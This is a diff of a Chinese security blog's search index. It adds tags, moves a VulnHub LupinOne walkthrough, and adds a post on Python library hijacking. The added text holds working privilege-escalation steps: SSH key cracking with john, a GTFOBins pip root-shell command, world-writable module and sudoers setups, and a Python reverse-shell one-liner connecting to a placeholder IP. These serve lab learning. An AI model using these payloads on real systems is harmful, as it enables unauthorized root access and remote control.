@@ -114,6 +114,7 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -186,6 +187,7 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -209,7 +211,7 @@
 <p>dnsalias.htb</p>
 <p>dynamicdns.htb</p>
 <p>no-ip.htb</p>
-<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#x6e;&#115;&#x40;&#100;&#121;&#110;&#x61;&#46;&#x68;&#116;&#x62;">&#x64;&#x6e;&#115;&#x40;&#100;&#121;&#110;&#x61;&#46;&#x68;&#116;&#x62;</a>获得)</p>
+<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#x6e;&#x73;&#64;&#100;&#x79;&#x6e;&#x61;&#46;&#104;&#x74;&#98;">&#x64;&#x6e;&#x73;&#64;&#100;&#x79;&#x6e;&#x61;&#46;&#104;&#x74;&#98;</a>获得)</p>
 </blockquote>
 <p>Beta中说网站正在测试模式下运行，并提供了共享凭据：</p>
 <blockquote>
@@ -374,6 +376,7 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -442,6 +445,7 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -541,6 +545,7 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -646,6 +651,7 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -786,6 +792,181 @@
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub-Empire:LupinOne</title>
+    <url>/2022/01/12/VulnHub-Empire-LupinOne/</url>
+    <content><![CDATA[<h1 id="VulnHub-Empire-LupinOne"><a href="#VulnHub-Empire-LupinOne" class="headerlink" title="VulnHub-Empire: LupinOne"></a>VulnHub-Empire: LupinOne</h1><p><strong>Level: Easy-Medium</strong></p>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111192526980.png" alt="image-20220111192526980"></p>
+<p>开放22、80端口，同时<code>robots.txt</code>中提示有个名为<code>/~myfiles</code>的目录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111194123394.png" alt="image-20220111194123394"></p>
+<p>假的404页面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111193628871.png" alt="image-20220111193628871"></p>
+<p>查看源码发现提示信息”Your can do it, keep trying.”</p>
+<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195222767.png" alt="image-20220111195222767"></p>
+<p>通过fuzz发现了另外一个目录<code>~secret</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195711410.png" alt="image-20220111195711410"></p>
+<p>筛选一下有用的信息</p>
+<blockquote>
+<p>疑似用户名：icex64 </p>
+<p>这个目录下藏有ssh的私钥</p>
+<p>用 fasttrack 破解密码</p>
+</blockquote>
+<p>继续fuzz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http://192.168.221.131/~secret/.FUZZ&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201339971.png" alt="image-20220111201339971"></p>
+<p>发现了<code>.mysecret.txt</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201618284.png" alt="image-20220111201618284"></p>
+<p>直接看不像是private key应该是编码过了，试了几种Base发现是base58 <a href="http://www.hiencode.com/base58w.html">解码点这</a></p>
+<p>解码后得到sshkey</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201903152.png" alt="image-20220111201903152"></p>
+<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>利用ssh2john获取sshkey的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py sshkey &gt; hash</span><br></pre></td></tr></table></figure>
+
+<p>再用John破解得到密码为<strong>P@55w0rd!</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111205221667.png" alt="image-20220111205221667"></p>
+<p>通过已知用户<strong>icex64</strong>连接ssh，获得一个flag</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112132931220.png" alt="image-20220112132931220"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>发现用户有权以<strong>arsene</strong>身份运行<strong>heist.py</strong>且免密</p>
+<p>查看<strong>webbrowser.py</strong>为任意用户可读写执行，利用python库劫持来利用该文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112134653023.png" alt="image-20220112134653023"></p>
+<h3 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h3><p>Python库劫持的方法后续会再写一篇文章来详细学习一下</p>
+<p>这里因为<strong>heist.py</strong>调用了<strong>webbrowser.py</strong>且该文件任意用户可写，直接在该文件中调用<code>/bin/bash</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112145242986.png" alt="image-20220112145242986"></p>
+<p>现在可以直接通过<strong>heist.py</strong>来切换为<strong>arsene</strong>用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用pip来Getshell"><a href="#利用pip来Getshell" class="headerlink" title="利用pip来Getshell"></a>利用pip来Getshell</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112150413564.png" alt="image-20220112150413564"></p>
+<p>简单看看<strong>arsene</strong>用户目录下，其中<strong>note.txt</strong>就是先前网页上看到的提示信息，其他没啥有用的</p>
+<p><code>sudo -l</code>发现用户有权以 <strong>root</strong> 身份执行<strong>pip</strong>且免密</p>
+<p>在<a href="https://gtfobins.github.io/">GTFOBins</a>上直接就有pip提权的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">pip install $TF</span><br></pre></td></tr></table></figure>
+
+<p>这里直接利用以上三条命令就可获得root权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152050911.png" alt="image-20220112152050911"></p>
+<p>root flag在**/root**目录下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152225053.png" alt="image-20220112152225053"></p>
+<p>end</p>
+]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python库劫持</title>
+    <url>/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/</url>
+    <content><![CDATA[<h1 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h1><p>之前在做VulnHub的时候需要利用<strong>Python库劫持</strong>，决定具体学习一下</p>
+<span id="more"></span>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>利用渗透环境中已有的python脚本来提权，该脚本可能引入了其他库，通过对引入文件的错误配置进行利用来提权。能应用到的场景还是有一定局限性</p>
+<h2 id="Python脚本编写"><a href="#Python脚本编写" class="headerlink" title="Python脚本编写"></a>Python脚本编写</h2><p>我这里直接模仿靶机里的python脚本来写了，该脚本引入<strong>webbrowser</strong>模块，使用<strong>open</strong>函数打开baidu</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import webbrowser</span><br><span class="line">print(&quot;welcome hacker~&quot;)</span><br><span class="line">webbrowser.open(&quot;https://www.baidu.com&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150511113.png" alt="image-20220113150511113"></p>
+<p>看一下运行效果</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150621602.png" alt="image-20220113150621602"></p>
+<h2 id="场景一（写权限）"><a href="#场景一（写权限）" class="headerlink" title="场景一（写权限）"></a>场景一（写权限）</h2><p>该漏洞基于python脚本引入的模块文件的权限</p>
+<p>当正在引入的模块文件的权限为任意用户可编辑时就会成为一个漏洞</p>
+<h3 id="漏洞创建"><a href="#漏洞创建" class="headerlink" title="漏洞创建"></a>漏洞创建</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113154813928.png" alt="image-20220113154813928"></p>
+<p>提前准备的<strong>hack.py</strong>引入了<strong>webbrowser</strong>模块，为了演示第一种漏洞利用，找到该模块文件并赋予任意用户可编辑权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate webbrowser.py</span><br><span class="line">sudo chmod 777 /usr/lib/python3.8/webbrowser.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113154213109.png" alt="image-20220113154213109"></p>
+<p>接下来创建一种运行<strong>hack.py</strong>的方法，通过修改**/etc/sudoers**</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113155600081.png" alt="image-20220113155600081"></p>
+<p>攻击者在远程连接后，可以通过如图方式来执行<strong>hack.py</strong></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设攻击者已经拿下了<strong>rabbit</strong>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113160108886.png" alt="image-20220113160108886"></p>
+<p><code>sudo -l</code>查看当前用户可执行的指令发现，可以以root免密执行<strong>hack.py</strong></p>
+<p>读取<strong>hack.py</strong>的内容，其中引入了<strong>webbrowser</strong>库，<code>locate</code>定位<strong>webbrowser.py</strong>发现有很多</p>
+<p>由于使用的是<strong>python3.8</strong>来执行脚本，查看**/usr/lib/python3.8/webbrowser.py**的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113201726611.png" alt="image-20220113201726611"></p>
+<p>为任意用户可写，此时有<strong>两种方式</strong>来获得root权限</p>
+<blockquote>
+<ol>
+<li>直接在webbrowser.py中写入命令获取root的shell</li>
+<li>webbrowser.py的open函数中写入命令，反弹shell获得root权限</li>
+</ol>
+</blockquote>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano /usr/lib/python3.8/webbrowser.py</span><br><span class="line">os.system(&quot;/bin/bash&quot;) //写入的命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113202321662.png" alt="image-20220113202321662"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113202238717.png" alt="image-20220113202238717"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>在<strong>webbrowser.py</strong>定义open函数的地方写入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;ip&quot;</span>,port));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113204427695.png" alt="image-20220113204427695"></p>
+<p>在受害机上执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/python3.8 /home/wi11/hack.py</span><br></pre></td></tr></table></figure>
+
+<p>接下来在Kali另起一个终端监听刚才写进去的端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113204122692.png" alt="image-20220113204122692"></p>
+<p>成功反弹shell，权限为root</p>
+<h2 id="场景二（优先顺序）"><a href="#场景二（优先顺序）" class="headerlink" title="场景二（优先顺序）"></a>场景二（优先顺序）</h2><p>该漏洞基于python脚本在导入模块时，python将按照特定的优先级顺序查找指定的模块文件</p>
+<p>当你导入一个模块，Python 解析器对模块位置的搜索顺序是：</p>
+<ol>
+<li>当前目录</li>
+<li>如果不在当前目录，Python 则搜索在 shell 变量 PYTHONPATH 下的每个目录。</li>
+<li>如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为/usr/local/lib/python/。</li>
+</ol>
+<p>如果<strong>可执行脚本所属者</strong>和<strong>攻击者获得的用户</strong>为同一用户，就可以在python脚本文件所属目录下创建一个模块文件，这样就会优先导入”伪造的模块“，最终实现提权</p>
+<h3 id="漏洞创建-1"><a href="#漏洞创建-1" class="headerlink" title="漏洞创建"></a>漏洞创建</h3><p>首先把场景一中修改的**/usr/lib/python3.8/webbrowser.py**权限恢复原样</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114095634860.png" alt="image-20220114095634860"></p>
+<p>修改**/etc/sudoers<strong>，场景一中我们设置的是</strong>rabbit<strong>用户，这次我们改为</strong>wi11**用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114095831722.png" alt="image-20220114095831722"></p>
+<p>其他内容不变</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>假设攻击者已经拿下了<strong>wi11</strong>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114104814072.png" alt="image-20220114104814072"></p>
+<p><code>sudo -l</code>查看当前用户可执行的指令发现，可以以root免密执行<strong>hack.py</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114105236849.png" alt="image-20220114105236849"></p>
+<p>读取<strong>hack.py</strong>的内容，其中引入了<strong>webbrowser</strong>库，<code>locate</code>定位<strong>webbrowser.py</strong>发现有很多</p>
+<p>由于使用的是<strong>python3.8</strong>来执行脚本，查看**/usr/lib/python3.8/webbrowser.py**的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114104929691.png" alt="image-20220114104929691"></p>
+<p>当前用户不可写，另寻出路</p>
+<p>由于<strong>hack.py</strong>在**/home/wi11<strong>目录下，并且攻击者用</strong>wi11<strong>远程连接，</strong>可执行脚本所属者<strong>和</strong>攻击者获得的用户**为同一用户</p>
+<p>此时可利用python在导入模块的优先顺序来获得root权限</p>
+<p>在**/home/wi11<strong>目录下创建</strong>webbrowser.py**，内容为</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114110116530.png" alt="image-20220114110116530"></p>
+<p>接下来在Kali另起一个终端监听刚才写进去的端口，执行<strong>hack.py</strong>脚本</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114110438495.png" alt="image-20220114110438495"></p>
+<p>成功反弹shell，权限为root</p>
+<h2 id="场景三（Python-PATH环境变量）"><a href="#场景三（Python-PATH环境变量）" class="headerlink" title="场景三（Python PATH环境变量）"></a>场景三（Python PATH环境变量）</h2><p>此漏洞基于通过<strong>PYTHONPATH</strong>环境变量搜索Python库，当攻击者可以修改该变量，就会产生漏洞</p>
+<h3 id="漏洞创建-2"><a href="#漏洞创建-2" class="headerlink" title="漏洞创建"></a>漏洞创建</h3><p>先把受害机所有配置还原为初始状态，删除**/home/wi11<strong>目录下的</strong>webbrowser.py**</p>
+<p>修改**/etc/sudoers<strong>，这次使用</strong>rabbit<strong>用户并且添加</strong>SETENV**，允许sudo使用当前用户命令行中设置的环境变量</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114140349756.png" alt="image-20220114140349756"></p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>假设攻击者已经拿下了<strong>rabbit</strong>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114141144288.png" alt="image-20220114141144288"></p>
+<p><code>sudo -l</code>查看当前用户可执行的指令发现可以以root免密执行<strong>hack.py</strong>并且允许sudo设置环境变量</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114105236849.png" alt="image-20220114105236849"></p>
+<p>读取<strong>hack.py</strong>的内容，其中引入了<strong>webbrowser</strong>库，<code>locate</code>定位<strong>webbrowser.py</strong>发现有很多</p>
+<p>由于使用的是<strong>python3.8</strong>来执行脚本，查看**/usr/lib/python3.8/webbrowser.py**的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114141929803.png" alt="image-20220114141929803"></p>
+<p>没有写入权限，场景一方法不可用</p>
+<p>还记得Python 解析器对模块位置的搜索顺序么？</p>
+<p>第一优先级为python脚本当前目录，但是攻击者只获得了<strong>rabbit</strong>用户，而python脚本在**/home/wi11**目录下</p>
+<p>第二优先级为Python搜索在shell变量<strong>PYTHONPATH</strong>下的每个目录，<strong>rabbit</strong>用户有权限通过sudo设置环境变量！</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114142141860.png" alt="image-20220114142141860"></p>
+<p>在**/tmp<strong>目录下新建一个</strong>webbrowser.py**内容同场景二</p>
+<p>接下来在Kali另起一个终端监听刚才写进去的端口，执行<strong>hack.py</strong>脚本并且设置<code>PYTHONPATH=/tmp/</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114142447882.png" alt="image-20220114142447882"></p>
+<p>成功反弹shell，权限为root</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在开发调试时，能快捷方便的执行任务的重要性可能会优先于环境的安全性，但是调试完毕以后要及时恢复系统的各项配置，不然配置错误可能会导致更加严重后果</p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1164,73 +1345,9 @@
 <p>第一次看工具代码 可能写的有点乱 有问题欢迎指出交流</p>
 ]]></content>
       <tags>
+        <tag>Python</tag>
         <tag>sqlmap</tag>
         <tag>工具分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnHub-Empire:LupinOne</title>
-    <url>/2022/01/12/VulnHub-Empire-LupinOne/</url>
-    <content><![CDATA[<h1 id="VulnHub-Empire-LupinOne"><a href="#VulnHub-Empire-LupinOne" class="headerlink" title="VulnHub-Empire: LupinOne"></a>VulnHub-Empire: LupinOne</h1><p><strong>Level: Easy-Medium</strong></p>
-<span id="more"></span>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111192526980.png" alt="image-20220111192526980"></p>
-<p>开放22、80端口，同时<code>robots.txt</code>中提示有个名为<code>/~myfiles</code>的目录</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111194123394.png" alt="image-20220111194123394"></p>
-<p>假的404页面</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111193628871.png" alt="image-20220111193628871"></p>
-<p>查看源码发现提示信息”Your can do it, keep trying.”</p>
-<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195222767.png" alt="image-20220111195222767"></p>
-<p>通过fuzz发现了另外一个目录<code>~secret</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195711410.png" alt="image-20220111195711410"></p>
-<p>筛选一下有用的信息</p>
-<blockquote>
-<p>疑似用户名：icex64 </p>
-<p>这个目录下藏有ssh的私钥</p>
-<p>用 fasttrack 破解密码</p>
-</blockquote>
-<p>继续fuzz</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http://192.168.221.131/~secret/.FUZZ&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201339971.png" alt="image-20220111201339971"></p>
-<p>发现了<code>.mysecret.txt</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201618284.png" alt="image-20220111201618284"></p>
-<p>直接看不像是private key应该是编码过了，试了几种Base发现是base58 <a href="http://www.hiencode.com/base58w.html">解码点这</a></p>
-<p>解码后得到sshkey</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201903152.png" alt="image-20220111201903152"></p>
-<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>利用ssh2john获取sshkey的哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py sshkey &gt; hash</span><br></pre></td></tr></table></figure>
-
-<p>再用John破解得到密码为<strong>P@55w0rd!</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt hash</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111205221667.png" alt="image-20220111205221667"></p>
-<p>通过已知用户<strong>icex64</strong>连接ssh，获得一个flag</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112132931220.png" alt="image-20220112132931220"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>发现用户有权以<strong>arsene</strong>身份运行<strong>heist.py</strong>且免密</p>
-<p>查看<strong>webbrowser.py</strong>为任意用户可读写执行，利用python库劫持来利用该文件</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112134653023.png" alt="image-20220112134653023"></p>
-<h3 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h3><p>Python库劫持的方法后续会再写一篇文章来详细学习一下</p>
-<p>这里因为<strong>heist.py</strong>调用了<strong>webbrowser.py</strong>且该文件任意用户可写，直接在该文件中调用<code>/bin/bash</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112145242986.png" alt="image-20220112145242986"></p>
-<p>现在可以直接通过<strong>heist.py</strong>来切换为<strong>arsene</strong>用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用pip来Getshell"><a href="#利用pip来Getshell" class="headerlink" title="利用pip来Getshell"></a>利用pip来Getshell</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112150413564.png" alt="image-20220112150413564"></p>
-<p>简单看看<strong>arsene</strong>用户目录下，其中<strong>note.txt</strong>就是先前网页上看到的提示信息，其他没啥有用的</p>
-<p><code>sudo -l</code>发现用户有权以 <strong>root</strong> 身份执行<strong>pip</strong>且免密</p>
-<p>在<a href="https://gtfobins.github.io/">GTFOBins</a>上直接就有pip提权的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">pip install $TF</span><br></pre></td></tr></table></figure>
-
-<p>这里直接利用以上三条命令就可获得root权限</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152050911.png" alt="image-20220112152050911"></p>
-<p>root flag在**/root**目录下</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152225053.png" alt="image-20220112152225053"></p>
-<p>end</p>
-]]></content>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>渗透测试</tag>
       </tags>
   </entry>
 </search>
